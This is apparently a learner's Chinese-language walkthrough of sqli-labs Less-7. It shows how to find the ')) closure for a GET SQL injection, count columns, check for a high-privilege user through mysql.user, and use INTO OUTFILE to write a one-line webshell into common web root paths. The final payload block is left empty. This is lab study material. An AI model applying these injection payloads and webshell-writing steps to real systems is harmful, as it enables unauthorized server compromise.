# Less-7 导出文件GET字符型注入
  新题型，如果可以写入文件，那么我们最简单的是上传一句话马 直接连，就可以获取一个低权限的账户，所以如果在注入中存在此类问题，那也是比较危险的漏洞
?id=1' 报错
?id=1'--+ 报错
?id=1" 正常
?id=1')--+ 报错
**?id=1'))--+ 正常回显，判断'))闭合**
![](assets/Less7/file-20260530161647106.png)

- 判断列数
?id=1')) order by 3--+ 列数为3

- 导入一句话木马
使用**outfile** 写入到服务器，我们一般可以利用这个漏洞写入一句话马
	这里需要有两个已知项 1 字段值 2 绝对地址
	并且 系统必须有可读可写，在服务器上，完整的路径，
	导出命令： union select 1,2,3 into outfile "绝对地址" %23
- paylaod
	一般web都存放在默认的目录下，比如：
		1 c:/inetpub/wwwroot/
		2 linux的nginx一般是/usr/local/nginx/html
		3 /home/wwwroot/default
		4 /usr/share/nginx
		5 /var/www/html
	然后 验证是否具有这几个条件
	1. 验证文件权限的可读
	1')) and (select count(*) from mysql.user)>0 %23 
	**正常 → 确认是高权限用户，可以进行文件注入**
	2. 注入文件
	这里要求猜一下他的绝对路径
	```payload
	
	```

